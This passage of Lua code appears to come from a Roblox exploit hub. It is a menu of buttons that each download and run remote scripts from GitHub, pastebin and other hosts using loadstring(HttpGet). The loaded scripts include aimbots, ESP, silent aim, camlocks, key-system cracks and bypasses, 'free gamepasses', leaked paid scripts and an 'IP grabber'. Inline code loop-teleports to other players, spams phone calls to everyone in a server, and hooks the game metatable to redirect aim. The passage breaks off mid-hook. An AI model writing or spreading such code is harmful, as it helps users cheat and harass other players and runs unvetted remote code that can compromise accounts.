            v286.Force = Vector3.new(9999, 9999, 9999)
            v286.Name = "YeetForce"
            vu254.Character.HumanoidRootPart.CFrame = v285.Character.HumanoidRootPart.CFrame
            v286.Location = v285.Character.HumanoidRootPart.Position
            game:FindService("RunService").Heartbeat:wait()
            if not v285.Character:FindFirstChild("Head") then
            end
        end
        vu277("Invalid player")
    end)
    vu277("Loaded successfully! Created by scuba#0001", 5)
    vu1:Notification("Notification", "*[FE] yeet gui Script Activated!", "Okay!")
end)
v253:Button("Enable creepstu", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source"))()
    vu1:Notification("Notification", "creepstu Activated", "Okay!")
end)
v253:Button("Enable FE Invisible & Teleport GUI R15/R6", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI"))()
    vu1:Notification("Notification", "FE Invisible & Teleport GUI R15/R6 Activated", "Okay!")
end)
v253:Button("Enable FE Mimik GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./8fb5ed20fb168d1ae3044ede45b90f67e3fb37a2/file", true))()
    vu1:Notification("Notification", "FE Mimik GUI R15/R6 Activated", "Okay!")
end)
v253:Button("Enable IP GRABBER (TROLL)", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/aziWwaw2"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "IP GRABBER (TROLL) Activated", "Okay!")
end)
local v287 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Universal")
v287:Button("Enable LaukHubKeyBypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/un_LaukHubKeyBypass", true))()
    vu1:Notification("Notification", "LaukHubKeyBypass Activated!", "Okay!")
end)
v287:Button("Enable FrostLuaKeyBypass", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
    vu1:Notification("Notification", "FrostLua Activated!", "Okay!")
end)
v287:Button("Enable platoboost(BYPASS THE KEYSTEM)", function()
    loadstring(game:HttpGet("https://you.whimper.xyz/platoboost"))()
    vu1:Notification("Notification", "platoboost Activated!", "Okay!")
end)
v287:Button("Enable Aimbot-universal", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U", true))()
    vu1:Notification("Notification", "Aimbot-universal Activated!", "Okay!")
end)
v287:Button("Enable universal ESP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP", true))()
    vu1:Notification("Notification", "universal ESP Activated!", "Okay!")
end)
v287:Button("Enable Universal Spy Gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy gui.lua"))()
    vu1:Notification("Notification", "Universal Spy Gui Activated!", "Okay!")
end)
v287:Button("Enable UNIVERSAL TRANSLATOR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/TRANSLATOR/main/UNIVERSALTRANSLATOR", true))()
    vu1:Notification("Notification", " UNIVERSAL TRANSLATOR Activated!", "Okay!")
end)
v287:Button("Enable Universal FPS Script/ScriptHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/kjerdhfgikrfujh", true))()
    vu1:Notification("Notification", "Universal FPS Script Activated!", "Okay!")
end)
v287:Button("Enable Universal Aimbot", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Equinox-Hub/main/aimbot.lua", true))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Universal Aimbot Activated!", "Okay!")
end)
v287:Button("Enable Universal Aimbot & ESP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/aimbotnesp/main/aimbotnesp", true))()
    vu1:Notification("Notification", "aimbotnesp Activated!", "Okay!")
end)
v287:Button("Enable Universal Aimbot & TriggerBot", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua"))()
    vu1:Notification("Notification", "Open-Aimbot Activated!", "Okay!")
end)
v287:Button("Enable Universal Teleport GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sytsytdispatch/universal-teleport-v1.0/main/unitp.lua"))()
    vu1:Notification("Notification", "Universal Teleport GUI Activated!", "Okay!")
end)
v287:Button("Enable Universal POV Changer", function()
    loadstring(game:GetObjects("rbxassetid://15046298025")[1].Source)()
    vu1:Notification("Notification", "Universal POV Changer Activated!", "Okay!")
end)
v287:Button("Enable Universal FPS & PING VIEWER", function()
    repeat
        wait()
    until game:IsLoaded()
    wait(2)
    local v288 = Instance.new("ScreenGui")
    local v289 = Instance.new("TextLabel")
    local v290 = Instance.new("TextLabel")
    v288.Parent = game.CoreGui
    v288.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    v289.Name = "Fps"
    v289.Parent = v288
    v289.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v289.BackgroundTransparency = 1
    v289.Position = UDim2.new(0.786138654, 0, 0, 0)
    v289.Size = UDim2.new(0, 125, 0, 25)
    v289.Font = Enum.Font.SourceSans
    v289.TextColor3 = Color3.fromRGB(255, 255, 255)
    v289.TextScaled = true
    v289.TextSize = 14
    v289.TextWrapped = true
    v290.Name = "Ping"
    v290.Parent = v288
    v290.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v290.BackgroundTransparency = 1
    v290.BorderColor3 = Color3.fromRGB(255, 255, 255)
    v290.Position = UDim2.new(0.700000048, 0, 0, 0)
    v290.Size = UDim2.new(0, 125, 0, 25)
    v290.Font = Enum.Font.SourceSans
    v290.TextColor3 = Color3.fromRGB(253, 253, 253)
    v290.TextScaled = true
    v290.TextSize = 14
    v290.TextWrapped = true
    local vu291 = Instance.new("LocalScript", v289)
    game:GetService("RunService").RenderStepped:Connect(function(p292)
        vu291.Parent.Text = "FPS: " .. math.round(1 / p292)
    end)
    local vu293 = Instance.new("LocalScript", v290)
    game:GetService("RunService").RenderStepped:Connect(function(p294)
        vu293.Parent.Text = "Ping: " .. game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(math.round(2 / p294))
    end)
    vu1:Notification("Notification", "Universal FPS & PING VIEWER Activated", "Okay!")
end)
v287:Button("Universal RTX RESOLUTION", function()
    Instance.new("BlurEffect", game.Lighting).Size = 4.1
    game.Lighting.GlobalShadows = true
    settings().Rendering.QualityLevel = "Level21"
    local v295, v296, v297 = pairs(game:GetDescendants())
    while true do
        local v298
        v297, v298 = v295(v296, v297)
        if v297 == nil then
            break
        end
        if v298:IsA("BasePart") or (v298:IsA("Union") or (v298:IsA("CornerWedgePart") or v298:IsA("TrussPart"))) then
            v298.Reflectance = v298.Reflectance + 1
        elseif v298:IsA("MeshPart") then
            v298.Reflectance = v298.Reflectance + 1
        end
    end
    vu1:Notification("Notification", "Universal RTX RESOLUTION", "Okay!")
end)
v287:Button("Universal Teleport Menu (OP)", function()
    local v299 = game:GetService("Players")
    local vu300 = game:GetService("RunService")
    local vu301 = v299.LocalPlayer
    local vu302 = Instance.new("ScreenGui")
    vu302.Name = "PlayerButtonsGui"
    vu302.Parent = game:GetService("CoreGui")
    local vu303 = Instance.new("Frame")
    vu303.Size = UDim2.new(0, 300, 0, 400)
    vu303.Position = UDim2.new(0, 10, 0, 10)
    vu303.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
    vu303.BorderColor3 = Color3.fromRGB(34, 34, 34)
    vu303.Active = true
    vu303.Draggable = true
    vu303.Parent = vu302
    local v304 = Instance.new("TextButton")
    v304.Size = UDim2.new(0, 20, 0, 20)
    v304.Position = UDim2.new(0, 5, 0, 5)
    v304.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    v304.Text = "X"
    v304.Parent = vu303
    local vu305 = Instance.new("TextButton")
    vu305.Size = UDim2.new(0, 20, 0, 20)
    vu305.Position = UDim2.new(1, - 25, 0, 5)
    vu305.BackgroundColor3 = Color3.fromRGB(255, 102, 102)
    vu305.Text = "-"
    vu305.Parent = vu303
    local vu306 = Instance.new("ScrollingFrame")
    vu306.Size = UDim2.new(1, - 10, 1, - 30)
    vu306.Position = UDim2.new(0, 5, 0, 25)
    vu306.CanvasSize = UDim2.new(0, 0, 0, 0)
    vu306.Parent = vu303
    vu306.BackgroundTransparency = 1
    local function vu308(p307)
        vu301.Character.HumanoidRootPart.CFrame = p307.Character.HumanoidRootPart.CFrame
    end
    local function vu315(pu309)
        local v310 = Instance.new("TextButton")
        v310.Size = UDim2.new(1, 0, 0, 30)
        local v311 = vu306
        v310.Position = UDim2.new(0, 0, 0, # v311:GetChildren() * 40)
        v310.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
        v310.TextColor3 = Color3.fromRGB(255, 255, 255)
        v310.Font = Enum.Font.Gotham
        v310.TextSize = 12
        v310.Text = pu309.Name
        v310.TextWrapped = true
        v310.TextXAlignment = Enum.TextXAlignment.Left
        v310.Parent = vu306
        local vu312 = Instance.new("TextButton")
        vu312.Size = UDim2.new(0.5, - 5, 1, 0)
        vu312.Position = UDim2.new(0.5, 5, 0, 0)
        vu312.BackgroundColor3 = Color3.fromRGB(139, 34, 34)
        vu312.TextColor3 = Color3.fromRGB(255, 255, 255)
        vu312.Font = Enum.Font.Gotham
        vu312.TextSize = 10
        vu312.Text = "Loop TP"
        vu312.TextWrapped = true
        vu312.TextXAlignment = Enum.TextXAlignment.Center
        vu312.Parent = v310
        local vu313 = false
        local vu314 = nil
        vu312.MouseButton1Click:Connect(function()
            if vu313 then
                vu312.Text = "Loop TP"
                vu314:Disconnect()
                vu313 = false
            else
                vu312.Text = "Stop TP"
                vu314 = vu300.RenderStepped:Connect(function()
                    if vu301.Character and pu309.Character then
                        vu308(pu309)
                    end
                end)
                vu313 = true
            end
        end)
        v310.MouseButton1Click:Connect(function()
            if not vu313 then
                vu308(pu309)
            end
        end)
    end
    local v316, v317, v318 = ipairs(v299:GetPlayers())
    local vu319 = vu306
    local v320 = vu301
    while true do
        local v321
        v318, v321 = v316(v317, v318)
        if v318 == nil then
            break
        end
        if v321 ~= v320 then
            vu315(v321)
        end
    end
    v299.PlayerAdded:Connect(function(p322)
        vu315(p322)
    end)
    v299.PlayerRemoving:Connect(function(p323)
        local v324 = vu319:GetChildren()
        local v325, v326, v327 = ipairs(v324)
        while true do
            local v328
            v327, v328 = v325(v326, v327)
            if v327 == nil then
                break
            end
            if v328:IsA("TextButton") and v328.Text == p323.Name then
                v328:Destroy()
            end
        end
    end)
    vu305.MouseButton1Click:Connect(function()
        if vu303.Size ~= UDim2.new(0, 300, 0, 400) then
            vu303.Size = UDim2.new(0, 300, 0, 400)
            vu305.Text = "-"
            vu305.Position = UDim2.new(1, - 25, 0, 5)
        else
            vu303.Size = UDim2.new(0, 30, 0, 30)
            vu305.Text = "+"
            vu305.Position = UDim2.new(1, - 25, 0, 5)
        end
    end)
    v304.MouseButton1Click:Connect(function()
        vu302:Destroy()
    end)
    vu1:Notification("Notification", "Universal Teleport Menu (OP)", "Okay!")
end)
v287:Button("Enable Free Gamepasses", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2", true))()
    vu1:Notification("Notification", "Free Gamepasses Activated!", "Okay!")
end)
local v329 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Anti-VIRUS")
v329:Label("Protects you from malicious scripts/ip grabber/robux stealers")
v329:Label("both scripts are fully open source they on github/scriptblox")
v329:Button("Enable Guardian V2(GalacticHypernova)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/MainProd"))()
    vu1:Notification("Notification", "GalacticHypernova Activated!", "Okay!")
end)
v329:Button("Enable RoTotal(Vxsty)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/antivirus/main/antivirus"))()
    vu1:Notification("Notification", "RoTotal Activated!", "Okay!")
end)
local v330 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 DaHood Misc")
v330:Button("Enable Low-GFX", function()
    local v331, v332, v333 = pairs(workspace:GetDescendants())
    while true do
        local v334
        v333, v334 = v331(v332, v333)
        if v333 == nil then
            break
        end
        if v334.ClassName == "Part" or (v334.ClassName == "SpawnLocation" or (v334.ClassName == "WedgePart" or (v334.ClassName == "Terrain" or v334.ClassName == "MeshPart"))) then
            v334.Material = "Plastic"
        end
    end
    vu1:Notification("Notification", "Low-GFX Activated", "Okay!")
end)
v330:Button("Enable Fake-Macro & Speed", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/backupspeedtool/main/backupspeedtool", true))()
    vu1:Notification("Notification", "Fake-Macro & Speed Activated", "Okay!")
end)
v330:Button("Enable Macro", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/macromobbyballigusapo"))()
    vu1:Notification("Notification", "Macro Activated", "Okay!")
end)
v330:Button("Enable Permanent Shift-Lock-Macro", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownproootest/Permanent-Shift-Lock-Alt/alt/PermShiftlockAlt"))()
    vu1:Notification("Notification", "Permanent Shift-Lock-Macro Activated", "Okay!")
end)
v330:Button("Enable DH Fly IOS Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/dahoodios/main/hoodcustomfly", true))()
    vu1:Notification("Notification", "Fly Script Activated", "Okay!")
end)
v330:Button("Enable TP-WALKV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/Scripts/Tpwalk%20V4%20%5B%20BETA%20%5D.lua", true))()
    vu1:Notification("Notification", "TP-WALKV4 Activated", "Okay!")
end)
v330:Button("Enable KirbsWARE(ANTI-LOCK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wenny69420/KirbswareScripts/main/MobileV3"))()
    vu1:Notification("Notification", "KirbsWARE(ANTI-LOCK) Activated", "Okay!")
end)
v330:Button("Enable Vascal(ANTI-LOCK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gwaporoblox/Sub-to-vascal/main/Vascal-Antilock-tool"))()
    vu1:Notification("Notification", "Vascal(ANTI-LOCK) Activated", "Okay!")
end)
v330:Button("Enable Vingui Aim Viewer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/aniti-lock/main/antilock", true))()
    vu1:Notification("Notification", "Vingui Aim Viewer Activated", "Okay!")
end)
v330:Button("Enable DX9 Aim Viewer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DX9user-renpy/DaHoodScript/main/AimViewer/script.lua"))()
    vu1:Notification("Notification", "DX9 Activated", "Okay!")
end)
v330:Button("Enable call-all", function()
    local v335 = game:GetService("StarterGui")
    local v336, v337, v338 = pairs(game.Players:GetChildren())
    while true do
        local v339
        v338, v339 = v336(v337, v338)
        if v338 == nil then
            break
        end
        if v339.Name ~= game.Players.LocalPlayer.Name then
            game.Players.LocalPlayer.Backpack["[Phone]"].Parent = game.Players.LocalPlayer.Character
            game.ReplicatedStorage.MainEvent:FireServer("PhoneCall", tostring(v339.Name))
            task.wait()
            game.Players.LocalPlayer.Character["[Phone]"].Parent = game.Players.LocalPlayer.Backpack
            task.wait()
            local _, _ = pcall(v335.SetCoreGuiEnabled, v335, Enum.CoreGuiType.Backpack, true)
            task.wait(0.2)
        end
    end
    vu1:Notification("Notification", "Call-all Activated", "Okay!")
end)
v330:Button("Enable Auto-Reload", function()
    while _G.AutoReload == true and game:GetService("RunService").Heartbeat:Wait() do
        if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and (game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") and game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0) then
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"))
            wait(1)
        end
    end
    vu1:Notification("Notification", "Auto-Reload Activated", "Okay!")
end)
v330:Button("Enable Right-Click", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/RightClick"))()
    vu1:Notification("Notification", "Right-Click Activated!", "Okay!")
end)
local v340 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Locks-Camlocks")
v340:Button("Enable AzureModded", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
    vu1:Notification("Notification", "AzureModded Activated", "Okay!")
end)
v340:Button("Enable Azure Modded-Mob ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/azuremobile/main/azuremobile"))()
    vu1:Notification("Notification", "Azure Modded Mob Activated", "Okay!")
end)
v340:Button("Enable BalliwareV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/BalliwareV2"))()
    vu1:Notification("Notification", "BalliwareV2 Activated", "Okay!")
end)
v340:Button("Enable BalliwareV3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/BallwareV3"))()
    vu1:Notification("Notification", "BalliwareV3 Activated", "Okay!")
end)
v340:Button("Enable chariotsware", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()
    vu1:Notification("Notification", "chariotsware Activated", "Okay!")
end)
v340:Button("Enable tokwaware", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/tokwa-ware/main/tokwaware", true))()
    vu1:Notification("Notification", "tokwaware Activated", "Okay!")
end)
v340:Button("Enable Hellbound-Camlock", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hellbound-alt/Hellbound-camlock-op/main/Op", true))()
    vu1:Notification("Notification", "Hellbound-Camlock Activated", "Okay!")
end)
v340:Button("Enable sinxwareV2(CAMLOCK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/6illz/sinxwareV2/main/CAMLOCKV2", true))()
    vu1:Notification("Notification", "sinxwareV2 Activated", "Okay!")
end)
v340:Button("Enable RxcePH(CAMLOCK/SILENT)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/RXCEPH/main/RXCEPH", true))()
    vu1:Notification("Notification", "RXCEPH Activated", "Okay!")
end)
v340:Button("Enable Awakenv4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nahhhbruhhh12/Awakenv4done/main/Awakenv4"))()
    vu1:Notification("Notification", "Awakenv4 Activated", "Okay!")
end)
v340:Button("Enable Novasero(ESP/CAMLOCK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Aslando4/New/main/New"))()
    vu1:Notification("Notification", "Novasero Activated", "Okay!")
end)
v340:Button("Enable Tief lock", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tiefdej/this-obskid/main/tief%20camlock%20op%20ass%20shid"))()
    vu1:Notification("Notification", "Tief lock Activated", "Okay!")
end)
v340:Button("Enable Xenon lock", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/u9qa0Zwi"))()
    vu1:Notification("Notification", "Xenon lock Activated", "Okay!")
end)
v340:Button("Enable Vascal-Circle-Dot", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gwaporoblox/Sub-to-vascal/main/Vascal-Circle-DotXd"))()
    vu1:Notification("Notification", "Vascal-Circle-Dot Activated", "Okay!")
end)
v340:Button("Enable Vascal-Streamable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gwaporoblox/Sub-to-vascal/main/Vascal-Streamable"))()
    vu1:Notification("Notification", "Vascal-Streamable Activated", "Okay!")
end)
v340:Button("Enable AURA-X (REMAKE)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/k0nkx/Aura-x-skid-ez-remake-by-k0nkx/main/Sigma"))()
    vu1:Notification("Notification", "AURA-X (REMAKE) Activated", "Okay!")
end)
v340:Button("Enable nyula", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/nyulauh"))()
    vu1:Notification("Notification", "nyula Activated", "Okay!")
end)
v340:Button("Enable lunarcam(HOOD CUSTOMS)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/LunarCAM/main/lunarcam", true))()
    vu1:Notification("Notification", "lunarcam Activated", "Okay!")
end)
v340:Button("Enable Frostbyte", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Totocoems/Frostbyte-leaked/main/Frostbyte%20leaked"))()
    vu1:Notification("Notification", "Frostbyte Activated", "Okay!")
end)
v340:Button("Enable Silent Aim (C-TOOL IS NEEDED)", function()
    getgenv().RecurringPoint = "UpperTorso"
    getgenv().Hitbox = "UpperTorso"
    getgenv().Keybind = "c"
    getgenv().AimbotStrengthAmount = 0.013
    getgenv().PredictionAmount = 11
    getgenv().Radius = 25
    getgenv().UsePrediction = true
    getgenv().AimbotStrength = true
    getgenv().FirstPerson = true
    getgenv().ThirdPerson = true
    getgenv().TeamCheck = false
    getgenv().Enabled = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tenaaki/GenericAimbot/main/v1.0.0"))()
    vu1:Notification("Notification", "tenaaki Activated", "Okay!")
end)
v340:Button("Enable Fatality", function()
    local v341 = {
        Enabled = true,
        Prediction = 0.1433,
        HitscanPriority = "HumanoidRootPart",
        FOV = 100,
        Scan = true,
        JumpOffset = 0,
        TargetStrafeSettings = {
            Enabled = true,
            GiveTool = true,
            Speed = 1,
            Height = 4,
            Distance = 7
        },
        CameraLock = {
            Enabled = true,
            Smoothing = 0.5
        }
    }
    ScriptSettings = v341
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7dd05d66b1acebfeec4fb31431a601eb.lua"))()
    vu1:Notification("Notification", "Fatality Activated", "Okay!")
end)
v340:Button("Enable Trip-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/elxocasXD/Trip-Hub/main/Free%20Loader.lua"))()
    vu1:Notification("Notification", "Trip-Hub Activated", "Okay!")
end)
v340:Button("Enable Blazed(LEAKED)(PC MAYBE IPAD?)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/blazed-leak/main/blazed%20leak", true))()
    vu1:Notification("Notification", "Trip-Hub Activated", "Okay!")
end)
v340:Button("Enable Lock.cc GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberPlaysYT/Lock-cc-gui/main/Lock%20cc%20gui", true))()
    vu1:Notification("Notification", "LOCK.CC Activated", "Okay!")
end)
v340:Button("Enable BeamedWare.CC(V2)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RYZZCHIPSX/ryzzchips/main/beamed%20ware%20script"))()
    vu1:Notification("Notification", "BeamedWare.CC(V2) Activated", "Okay!")
end)
v340:Button("Enable Camlock", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CarlDaLocker/AntiLock/main/new%20op%20script", true))()
    vu1:Notification("Notification", "Camlock Activated", "Okay!")
end)
v340:Button("Enable Sonic\'s Camlock", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CarlDaLocker/AntiLock/main/SONIC%3F", true))()
    vu1:Notification("Notification", "Sonic\'s Camlock Activated", "Okay!")
end)
v340:Button("Enable Silent-Aim", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CarlDaLocker/AntiLock/main/Silent%20aim%20by%2021%20ca", true))()
    vu1:Notification("Notification", "Silent-Aim Activated", "Okay!")
end)
v340:Button("Enable DUKE SHADOW GUI (TONS OF LOCK/CAMLOCK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CarlDaLocker/AntiLock/main/OFFICIAL%20GUI%20OF%20DUKE%20SHADOW", true))()
    vu1:Notification("Notification", "DUKE SHADOW GUI (TONS OF LOCK/CAMLOCK) Activated", "Okay!")
end)
v340:Button("Enable Howl.cc(Requires C-Tool)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/howlcc/main/howlcc", true))()
    vu1:Notification("Notification", "Howl.cc Activated", "Okay!")
end)
v340:Button("Enable Silent Aim(XORA)", function()
    if not Game:IsLoaded() then
        Game.Loaded:Wait()
    end
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
    local v342 = getgenv()
    local v343 = {}
    local v344 = {
        Toggled = true,
        AimPart = "HumanoidRootPart",
        HitChance = 100,
        Prediction = {
            Enabled = true,
            Horizontal = 0.13745,
            Vertical = 0.13745
        },
        Circle = {
            Visible = true,
            Color = Color3.fromRGB(255, 255, 255),
            Transparency = 1,
            Thickness = 1.5,
            NumSides = 1000,
            Radius = 30,
            Filled = false
        }
    }
    v343.Settings = v344
    v342.Silent = v343
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/Scripts/Basic%20Silent-Aim", true))()
    vu1:Notification("Notification", "Silent Aim Activated", "Okay!")
end)
v340:Button("Enable Suicide.lol", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AvionM/erm/main/Protected_2150194676614565.lua.txt"))()
    vu1:Notification("Notification", "Howl.cc Activated", "Okay!")
end)
v340:Button("Enable Tapbot.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/tapbotcc/main/tapbotcc", true))()
    vu1:Notification("Notification", "Tapbot.cc Activated", "Okay!")
end)
v340:Button("Enable Drax(LEAK)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/draxleak/main/draxleak", true))()
    vu1:Notification("Notification", "Drax Activated", "Okay!")
end)
v340:Button("Enable private leaked(requires c tool)", function()
    local vu345 = {
        main = {
            enabled = true,
            aimlockkey = "c",
            prediction = 0.128984,
            aimpart = "HumanoidRootPart",
            notifications = true
        }
    }
    local vu346 = {
        box = {
            Showbox = true,
            boxsize = Vector3.new(3.3, 3, 2.8),
            markercolor = Color3.fromRGB(1, 120, 145),
            markersize = UDim2.new(1, 0, 3, 0)
        }
    }
    local vu347 = Instance.new("Part", game.Workspace)
    local v348 = game.Players.LocalPlayer:GetMouse()
    function makemarker(p349, p350, p351, p352, p353)
        local v354 = Instance.new("BillboardGui", p349)
        v354.Name = "PRIVATE-REWRITE!"
        v354.Adornee = p350
        v354.Size = UDim2.new(p352, p353, p352, p353)
        v354.AlwaysOnTop = true
        local v355 = Instance.new("Frame", v354)
        v355.Size = vu346.box.markersize
        v355.BackgroundColor3 = p351
        Instance.new("UICorner", v355).CornerRadius = UDim.new(50, 25)
        return v354
    end
    local vu356 = nil
    v348.KeyDown:Connect(function(p357)
        if p357 == vu345.main.aimlockkey then
            if vu345.main.enabled ~= true then
                vu356 = FindClosestUser()
                vu345.main.enabled = true
                if vu345.main.notifications == true then
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Private",
                        Text = "Locked On;  " .. tostring(vu356.Character.Humanoid.DisplayName)
                    })
                end
            else
                vu345.main.enabled = false
                if vu345.main.notifications == true then
                    vu356 = FindClosestUser()
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Private",
                        Text = "Unlocked;"
                    })
                end
            end
        end
    end)
    local v358 = game.Players:GetPlayers()
    function noob(p359)
        repeat
            wait()
        until p359.Character
        local vu360 = makemarker(guimain, p359.Character:WaitForChild(vu345.main.aimpart), Color3.fromRGB(107, 184, 255), 0.1, 8)
        vu360.Name = p359.Name
        p359.CharacterAdded:connect(function(p361)
            vu360.Adornee = p361:WaitForChild("HumanoidRootPart")
        end)
    end
    local vu362 = vu356
    local vu363 = vu345
    local vu364 = vu346
    for v365 = 1, # v358 do
        if v358[v365] ~= game.Players.LocalPlayer then
            noob(v358[v365])
        end
    end
    game.Players.PlayerAdded:connect(function(p366)
        noob(p366)
    end)
    spawn(function()
        vu347.Anchored = true
        vu347.CanCollide = false
        vu347.Size = vu364.box.boxsize
        if vu364.box.Showbox ~= true then
            vu347.Transparency = 1
        else
            vu347.Transparency = 0.7
        end
        makemarker(vu347, vu347, vu364.box.markercolor, 0.4, 1)
    end)
    function FindClosestUser()
        local v367, v368, v369 = pairs(game.Players:GetPlayers())
        local v370 = 300
        local v371 = nil
        while true do
            local v372
            v369, v372 = v367(v368, v369)
            if v369 == nil then
                break
            end
            if v372 ~= game.Players.LocalPlayer and v372.Character and (v372.Character:FindFirstChild("Humanoid") and v372.Character.Humanoid.Health ~= 0 and v372.Character:FindFirstChild("HumanoidRootPart")) then
                local v373 = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(v372.Character.PrimaryPart.Position)
                local v374 = (Vector2.new(v373.X, v373.Y) - Vector2.new(game.Players.LocalPlayer:GetMouse().X, game.Players.LocalPlayer:GetMouse().Y)).magnitude
                if v374 < v370 then
                    v371 = v372
                    v370 = v374
                end
            end
        end
        return v371
    end
    game:GetService("RunService").Stepped:connect(function()
        if vu363.main.enabled and vu362.Character and vu362.Character:FindFirstChild("HumanoidRootPart") then
            vu347.CFrame = CFrame.new(vu362.Character[vu363.main.aimpart].Position + vu362.Character.UpperTorso.Velocity * vu363.main.prediction)
        else
            vu347.CFrame = CFrame.new(0, 9999, 0)
        end
    end)
    repeat
        wait()
    until game:IsLoaded()
    local v375 = getrawmetatable(game)
    local vu376 = v375.__namecall
    setreadonly(v375, false)
    v375.__namecall = newcclosure(function(...)
        local v377 = {
            ...
        }
